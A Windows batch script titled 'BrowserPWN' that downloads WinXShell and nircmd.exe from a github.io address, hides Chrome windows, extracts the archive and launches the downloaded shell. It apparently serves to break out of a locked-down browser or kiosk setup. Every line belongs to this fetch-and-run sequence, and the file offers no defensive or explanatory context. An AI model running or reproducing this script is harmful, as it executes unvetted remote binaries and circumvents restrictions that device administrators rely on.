@echo off
title BrowserPWN
color 1f
echo ======== [BrowserPWN] ========
cd /d "%userprofile%"
echo Downloading WinXShell...
curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z >NUL
echo Initializing session...
curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe >NUL
nc win hide class Chrome_WidgetWin_1
"%ProgramFiles%\7-zip\7z.exe" x wx.7z -owx >NUL
start "" wx\winxshell\winxshell.exe
